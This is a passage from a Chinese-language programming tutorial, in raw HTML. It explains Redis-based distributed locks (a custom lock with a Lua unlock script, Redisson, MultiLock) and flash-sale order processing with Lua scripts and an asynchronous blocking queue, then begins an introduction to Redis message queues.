class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SimpleRedisLock</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ILock</span> &#123;<br><br>    <span class="hljs-keyword">private</span> String name;<br><br>    <span class="hljs-keyword">private</span> StringRedisTemplate template;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">KEY_PREFIX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;lock:&quot;</span>;<br><br>    <span class="hljs-comment">// 注意：hutool包下的UUID方法</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">ID_PREFIX</span> <span class="hljs-operator">=</span> UUID.randomUUID().toString(<span class="hljs-literal">true</span>) + <span class="hljs-string">&quot;-&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">SimpleRedisLock</span><span class="hljs-params">(String name, StringRedisTemplate template)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.template = template;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryLock</span><span class="hljs-params">(<span class="hljs-type">long</span> timeoutSec)</span> &#123;<br>        <span class="hljs-comment">// 获取线程标识</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">threadId</span> <span class="hljs-operator">=</span> ID_PREFIX + Thread.currentThread().getId();<br>        <span class="hljs-comment">// 获取锁</span><br>        <span class="hljs-type">Boolean</span> <span class="hljs-variable">success</span> <span class="hljs-operator">=</span> template.opsForValue().setIfAbsent(KEY_PREFIX + name, threadId, timeoutSec, TimeUnit.SECONDS);<br>        <span class="hljs-keyword">return</span> Boolean.TRUE.equals(success);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unlock</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// 获取线程标识</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">threadId</span> <span class="hljs-operator">=</span> ID_PREFIX + Thread.currentThread().getId();<br>        <span class="hljs-comment">// 获取锁标识</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">id</span> <span class="hljs-operator">=</span> template.opsForValue().get(KEY_PREFIX + name);<br>        <span class="hljs-keyword">if</span> (threadId.equals(id)) &#123;<br>            <span class="hljs-comment">// 释放锁</span><br>            template.delete(KEY_PREFIX + name);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="Lua脚本解决原子性"><a href="#Lua脚本解决原子性" class="headerlink" title="Lua脚本解决原子性"></a>Lua脚本解决原子性</h5><p>判断锁和释放锁操作之间不存在原子性，可能仍会造成误删。</p><p>代码实现：</p><ol><li><p>在resources下创建 unlock.lua</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-comment">-- 比较线程标识与锁中的标识是否一致</span><br><span class="hljs-keyword">if</span>(redis.call(<span class="hljs-string">&#x27;get&#x27;</span>, KEYS[<span class="hljs-number">1</span>]) == ARGV[<span class="hljs-number">1</span>]) <span class="hljs-keyword">then</span><br>    <span class="hljs-keyword">return</span> redis.call(<span class="hljs-string">&#x27;del&#x27;</span>, KEYS[<span class="hljs-number">1</span>])<br><span class="hljs-keyword">end</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure></li><li><p>修改SimpleRedisLock：用静态代码块提前读取lua脚本文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.hmdp.utils;<br><br><span class="hljs-keyword">import</span> cn.hutool.core.lang.UUID;<br><span class="hljs-keyword">import</span> org.springframework.core.io.ClassPathResource;<br><span class="hljs-keyword">import</span> org.springframework.data.redis.core.StringRedisTemplate;<br><span class="hljs-keyword">import</span> org.springframework.data.redis.core.script.DefaultRedisScript;<br><br><span class="hljs-keyword">import</span> java.util.Collections;<br><span class="hljs-keyword">import</span> java.util.concurrent.TimeUnit;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SimpleRedisLock</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ILock</span> &#123;<br><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> StringRedisTemplate template;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">KEY_PREFIX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;lock:&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">ID_PREFIX</span> <span class="hljs-operator">=</span> UUID.randomUUID().toString(<span class="hljs-literal">true</span>) + <span class="hljs-string">&quot;-&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> DefaultRedisScript&lt;Long&gt; UNLOCK_SCRIPT;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        UNLOCK_SCRIPT = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultRedisScript</span>&lt;&gt;();<br>        UNLOCK_SCRIPT.setLocation(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPathResource</span>(<span class="hljs-string">&quot;unlock.lua&quot;</span>));<br>        UNLOCK_SCRIPT.setResultType(Long.class);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">SimpleRedisLock</span><span class="hljs-params">(String name, StringRedisTemplate template)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.template = template;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryLock</span><span class="hljs-params">(<span class="hljs-type">long</span> timeoutSec)</span> &#123;<br>        <span class="hljs-comment">// 获取线程标识</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">threadId</span> <span class="hljs-operator">=</span> ID_PREFIX + Thread.currentThread().getId();<br>        <span class="hljs-comment">// 获取锁</span><br>        <span class="hljs-type">Boolean</span> <span class="hljs-variable">success</span> <span class="hljs-operator">=</span> template.opsForValue().setIfAbsent(KEY_PREFIX + name, threadId, timeoutSec, TimeUnit.SECONDS);<br>        <span class="hljs-keyword">return</span> Boolean.TRUE.equals(success);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unlock</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// 调用lua脚本</span><br>        template.execute(<br>                UNLOCK_SCRIPT,<br>                Collections.singletonList(KEY_PREFIX + name),<br>                ID_PREFIX + Thread.currentThread().getId());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h3 id="4-4-Redisson"><a href="#4-4-Redisson" class="headerlink" title="4.4 Redisson"></a>4.4 Redisson</h3><p>Redisson是一个在Redis的基础上实现的Java驻内存数据网格（In-Memory Data Grid）。它不仅提供了一系列的分布式的Java常用对象，还提供了许多分布式服务，其中就包含了各种分布式锁的实现。</p><h4 id="4-4-1-配置"><a href="#4-4-1-配置" class="headerlink" title="4.4.1 配置"></a>4.4.1 配置</h4><ol><li><p>引入依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.redisson<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>redisson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.17.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>在config下创建RedissonConfig类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RedissonConfig</span> &#123;<br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> RedissonClient <span class="hljs-title function_">redissonClient</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// 配置</span><br>        <span class="hljs-type">Config</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Config</span>();<br>        config.useSingleServer().setAddress(<span class="hljs-string">&quot;redis://localhost:6379&quot;</span>).setPassword(<span class="hljs-string">&quot;123456&quot;</span>);<br>        <span class="hljs-comment">// 创建对象</span><br>        <span class="hljs-keyword">return</span> Redisson.create(config);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>修改VoucherOrderServiceImp中创建锁的逻辑</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Autowired</span><br><span class="hljs-keyword">private</span> RedissonClient redissonClient;<br><br><span class="hljs-comment">// 创建锁对象</span><br><span class="hljs-comment">//SimpleRedisLock lock = new SimpleRedisLock(&quot;order:&quot; + userId, template);</span><br><span class="hljs-type">RLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> redissonClient.getLock(<span class="hljs-string">&quot;lock:order:&quot;</span> + userId);<br><span class="hljs-comment">// 获取锁</span><br><span class="hljs-type">boolean</span> <span class="hljs-variable">isLock</span> <span class="hljs-operator">=</span> lock.tryLock();<br></code></pre></td></tr></table></figure></li></ol><h4 id="4-4-2-可重入锁"><a href="#4-4-2-可重入锁" class="headerlink" title="4.4.2 可重入锁"></a>4.4.2 可重入锁</h4><p>Redisson采用Redis的哈希结构，key为锁的名称，value为哈希结构：field为线程标识，value为重入次数</p><p>加锁解锁流程如下：</p><ol><li>加锁：判断锁是否存在<ul><li>若不存在，则获取锁并添加线程标识，设置锁的有效期，执行业务，进入第2步</li><li>若存在，则判断锁标识是否为当前线程<ul><li>若是，则锁计数加1，并设置锁的有效期，执行业务，进入第2步</li><li>若不是，获取锁失败</li></ul></li></ul></li><li>解锁：判断锁是否是自己的<ul><li>若是，则锁计数减1。<ul><li>若锁计数减为0，则释放锁</li><li>若锁计数不为0，则重置锁的有效期，继续执行上一层的业务，再进入第2步</li></ul></li><li>若不是，说明锁已被超时释放，逻辑结束</li></ul></li></ol><p>其中加锁与解锁中涉及到多个操作原子性的问题，Redisson用lua脚本实现</p><h4 id="4-4-3-锁重试与WatchDog机制"><a href="#4-4-3-锁重试与WatchDog机制" class="headerlink" title="4.4.3 锁重试与WatchDog机制"></a>4.4.3 锁重试与WatchDog机制</h4><p>此部分参照教程</p><p>Redisson分布式锁原理：</p><ul><li>可重入：利用hash结构记录线程id和重入次数</li><li>可重试：利用信号量和PubSub功能实现等待、唤醒，获取锁失败的重试机制</li><li>超时续约：利用watchDog，每隔一段时间（releaseTime &#x2F; 3），重置超时时间</li></ul><h4 id="4-4-4-MultiLock"><a href="#4-4-4-MultiLock" class="headerlink" title="4.4.4 MultiLock"></a>4.4.4 MultiLock</h4><p>此锁主要用于解决Redis分布式锁主从一致性问题：</p><p>采用Redis主从模式：写命令会在主机上执行，读命令会在从机上执行</p><p>当主机将数据同步到从机的过程中，主机宕机了，但并没有完成同步数据。当哨兵节点发现主机宕机，并重新选出一个主机时，此时新选出的主机并没有分布式锁的信息，此时便会出现线程安全问题。</p><p>为解决此问题，采用MultiLock。每个节点的都是相同的地位，只有当所有的节点都写入成功，才算是加锁成功。假设某个节点宕机，那么便成功完成加锁。</p><h2 id="5-秒杀优化"><a href="#5-秒杀优化" class="headerlink" title="5. 秒杀优化"></a>5. 秒杀优化</h2><h3 id="5-1-优化思路"><a href="#5-1-优化思路" class="headerlink" title="5.1 优化思路"></a>5.1 优化思路</h3><p>之前秒杀过程如下图所示，tomcat程序中的操作是串行执行。这样会导致较长的执行时间。</p><p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221102204723432.png" alt="image-20221102204723432"></p><p>优化思路为：将耗时比较短的逻辑放入Redis中：判断库存是否充足、判断是否为一人一单，这两个判断是业务的核心逻辑，判断正确无误意味着一定可以完成下单，便可返回订单ID。而耗时较长的逻辑：创建订单、减库存交由另外一个线程去处理，主线程只需要将与秒杀相关的优惠券ID、用户ID、订单ID保存到消息队列，让另外一个线程从队列中读取，并完成剩余的逻辑即可。</p><p>其中一人一单通过Redis中的set集合来完成，key为订单ID，value为set集合，里面存储用户ID。</p><p>新的流程为：</p><ul><li>对于主线程：<ol><li>从Redis中判断订单是否充足、判断是否满足一人一单</li><li>满足条件，则扣减Redis中的库存信息，将用户ID存入对应的set集合。此部分采用lua脚本以确保原子性</li><li>将相关信息添加到阻塞队列中</li><li>返回订单ID</li></ol></li><li>对于另外开辟的线程：<ol><li>从阻塞队列中获取优惠券ID、用户ID、订单ID等信息</li><li>将订单信息添加到数据库中，并扣减数据库中的库存</li></ol></li></ul><p>优化秒杀过程如下图所示</p><p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221102205318170.png" alt="image-20221102205318170"></p><h3 id="5-2-代码实现"><a href="#5-2-代码实现" class="headerlink" title="5.2 代码实现"></a>5.2 代码实现</h3><ol><li><p>修改VoucherServiceImpl中添加秒杀优惠券的方法addSeckillVoucher</p><p>在添加的过程中将库存保存到Redis</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-meta">@Transactional</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addSeckillVoucher</span><span class="hljs-params">(Voucher voucher)</span> &#123;<br>    <span class="hljs-comment">// 保存优惠券</span><br>    save(voucher);<br>    <span class="hljs-comment">// 保存秒杀信息</span><br>    <span class="hljs-type">SeckillVoucher</span> <span class="hljs-variable">seckillVoucher</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SeckillVoucher</span>();<br>    seckillVoucher.setVoucherId(voucher.getId());<br>    seckillVoucher.setStock(voucher.getStock());<br>    seckillVoucher.setBeginTime(voucher.getBeginTime());<br>    seckillVoucher.setEndTime(voucher.getEndTime());<br>    seckillVoucherService.save(seckillVoucher);<br>    <span class="hljs-comment">// 保存秒杀库存到Redis</span><br>    template.opsForValue().set(SECKILL_STOCK_KEY + voucher.getId(), voucher.getStock().toString());<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>用lua脚本实现Redis中查询库存、判断一人一单、减库存等操作</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-comment">-- 1.参数列表</span><br><span class="hljs-comment">-- 1.1.优惠券id</span><br><span class="hljs-keyword">local</span> voucherId = ARGV[<span class="hljs-number">1</span>]<br><span class="hljs-comment">-- 1.2.用户id</span><br><span class="hljs-keyword">local</span> userId = ARGV[<span class="hljs-number">2</span>]<br><span class="hljs-comment">-- 2.数据key</span><br><span class="hljs-comment">-- 2.1.库存key</span><br><span class="hljs-keyword">local</span> stockKey = <span class="hljs-string">&#x27;seckill:stock:&#x27;</span> .. voucherId<br><span class="hljs-comment">-- 2.2.订单key</span><br><span class="hljs-keyword">local</span> orderKey = <span class="hljs-string">&#x27;seckill:order:&#x27;</span> .. voucherId<br><br><span class="hljs-comment">-- 3.脚本业务</span><br><span class="hljs-comment">-- 3.1.判断库存是否充足 get stockKey</span><br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">tonumber</span>(redis.call(<span class="hljs-string">&#x27;get&#x27;</span>, stockKey)) &lt;= <span class="hljs-number">0</span>) <span class="hljs-keyword">then</span><br>    <span class="hljs-comment">-- 3.2.库存不足，返回1</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br><span class="hljs-keyword">end</span><br><span class="hljs-comment">-- 3.2.判断用户是否下单 SISMEMBER orderKey userId</span><br><span class="hljs-keyword">if</span>(redis.call(<span class="hljs-string">&#x27;sismember&#x27;</span>, orderKey, userId) == <span class="hljs-number">1</span>) <span class="hljs-keyword">then</span><br>    <span class="hljs-comment">-- 3.3.存在，说明是重复下单，返回2</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">2</span><br><span class="hljs-keyword">end</span><br><span class="hljs-comment">-- 3.4.扣库存 incrby stockKey -1</span><br>redis.call(<span class="hljs-string">&#x27;incrby&#x27;</span>, stockKey, <span class="hljs-number">-1</span>)<br><span class="hljs-comment">-- 3.5.下单（保存用户）sadd orderKey userId</span><br>redis.call(<span class="hljs-string">&#x27;sadd&#x27;</span>, orderKey, userId)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure></li><li><p>修改VoucherOrderServiceImpl中的seckillVoucher方法</p><p>由于proxy在另外一个线程中也需要用到，所以将其提到外面。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> DefaultRedisScript&lt;Long&gt; SECKILL_SCRIPT;<br><br><span class="hljs-keyword">static</span> &#123;<br>    SECKILL_SCRIPT = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultRedisScript</span>&lt;&gt;();<br>    SECKILL_SCRIPT.setLocation(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPathResource</span>(<span class="hljs-string">&quot;seckill.lua&quot;</span>));<br>    SECKILL_SCRIPT.setResultType(Long.class);<br>&#125;<br><br><span class="hljs-keyword">private</span> IVoucherOrderService proxy;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> Result <span class="hljs-title function_">seckillVoucher</span><span class="hljs-params">(Long voucherId)</span> &#123;<br>    <span class="hljs-type">Long</span> <span class="hljs-variable">userId</span> <span class="hljs-operator">=</span> UserHolder.getUser().getId();<br>    <span class="hljs-comment">// 1.执行lua脚本</span><br>    <span class="hljs-type">Long</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> template.execute(<br>        SECKILL_SCRIPT,<br>        Collections.emptyList(),<br>        voucherId.toString(), userId.toString()<br>    );<br>    <span class="hljs-comment">// 2.判断结果是否为0</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> result.intValue();<br>    <span class="hljs-comment">// 2.1 不为0，代表没有购买资格</span><br>    <span class="hljs-keyword">if</span> (r != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> Result.fail(r == <span class="hljs-number">1</span> ? <span class="hljs-string">&quot;库存不足&quot;</span> : <span class="hljs-string">&quot;不能重复下单&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">// 2.2 为0，有购买资格，把下单信息保存到阻塞队列</span><br>    <span class="hljs-type">VoucherOrder</span> <span class="hljs-variable">voucherOrder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VoucherOrder</span>();<br>    <span class="hljs-type">long</span> <span class="hljs-variable">orderId</span> <span class="hljs-operator">=</span> redisIdWorker.nextId(<span class="hljs-string">&quot;order&quot;</span>);<br>    voucherOrder.setId(orderId);<br>    voucherOrder.setUserId(userId);<br>    voucherOrder.setVoucherId(voucherId);<br>    <span class="hljs-comment">// 2.3 放入阻塞队列</span><br>    orderTasks.add(voucherOrder);<br>    <span class="hljs-comment">// 3.获取代理对象</span><br>    proxy = (IVoucherOrderService) AopContext.currentProxy();<br>    <span class="hljs-comment">// 4.返回订单id</span><br>    <span class="hljs-keyword">return</span> Result.ok(orderId);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>添加阻塞队列处理的逻辑，实现异步在数据库中完成下单操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 阻塞队列，存放相关订单信息</span><br><span class="hljs-keyword">private</span> BlockingQueue&lt;VoucherOrder&gt; orderTasks = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBlockingQueue</span>&lt;&gt;(<span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>);<br><span class="hljs-comment">// 异步执行线程池</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ExecutorService</span> <span class="hljs-variable">SECKILL_ORDER_EXECUTOR</span> <span class="hljs-operator">=</span> Executors.newSingleThreadExecutor();<br><span class="hljs-comment">// 在类初始化之前执行线程池任务</span><br><span class="hljs-meta">@PostConstruct</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> &#123;<br>    SECKILL_ORDER_EXECUTOR.submit(<span class="hljs-keyword">new</span> <span class="hljs-title class_">VoucherOrderHandler</span>());<br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VoucherOrderHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Runnable</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">// 1.获取队列中的订单信息</span><br>                <span class="hljs-type">VoucherOrder</span> <span class="hljs-variable">voucherOrder</span> <span class="hljs-operator">=</span> orderTasks.take();<br>                <span class="hljs-comment">// 2.创建订单</span><br>                handleVoucherOrder(voucherOrder);<br>            &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>                log.error(<span class="hljs-string">&quot;处理订单异常&quot;</span>, e);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleVoucherOrder</span><span class="hljs-params">(VoucherOrder voucherOrder)</span> &#123;<br>    <span class="hljs-type">Long</span> <span class="hljs-variable">userId</span> <span class="hljs-operator">=</span> voucherOrder.getUserId();<br>    <span class="hljs-comment">// 创建锁对象</span><br>    <span class="hljs-comment">//SimpleRedisLock lock = new SimpleRedisLock(&quot;order:&quot; + userId, template);</span><br>    <span class="hljs-type">RLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> redissonClient.getLock(<span class="hljs-string">&quot;lock:order:&quot;</span> + userId);<br>    <span class="hljs-comment">// 获取锁</span><br>    <span class="hljs-type">boolean</span> <span class="hljs-variable">isLock</span> <span class="hljs-operator">=</span> lock.tryLock();<br>    <span class="hljs-keyword">if</span> (!isLock) &#123;<br>        log.error(<span class="hljs-string">&quot;不允许重复下单&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">try</span> &#123;<br>        proxy.createVoucherOrder(voucherOrder);<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        lock.unlock();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h2 id="6-Redis消息队列"><a href="#6-Redis消息队列" class="headerlink" title="6. Redis消息队列"></a>6. Redis消息队列</h2><p>消息队列（Message Queue），字面意思就是存放消息的队列。最简单的消息队列模型包括3个角色：</p><ul><li>消息队列：存储和管理消息，也被称为消息代理（Message Broker）</li><li>生产者：发送消息到消息队列</li><li>消费者：从消息队列获取消息并处理消息</li></ul><p>Redis提供了三种不同的方式来实现消息队列：</p><ul><li>list结构：基于List结构模拟消息队列</li><li>PubSub：基本的点对点消息模型</li><li>Stream：比较完善的消息队列模型</li></ul><h3 id="6-1-基于List的消息队列"><a href="#6-1-基于List的消息队列" class="headerlink" title="6.1 基于List的消息队列"></a>6.1 基于List的消息队列</h3><p>Redis的list数据结构是一个双向链表，利用：LPUSH 结合 RPOP、或者 RPUSH 结合 LPOP实现。</p><p>当队列中没有消息时RPOP或LPOP操作会返回null，并不像JVM的阻塞队列那样会阻塞并等待消息。因此这里应该使用BRPOP或者BLPOP来实现阻塞效果。</p><p>优点：</p><ul><li>利用Redis存储，不受限于JVM内存上限</li><li>基于Redis的持久化机制，数据安全性有保证</li><li>可以满足消息有序性</li></ul><p>缺点：</p><ul><li>无法避免消息丢失</li><li>只支持单消费者</li></ul><h3 id="6-2-基于PubSub的消息队列"><a 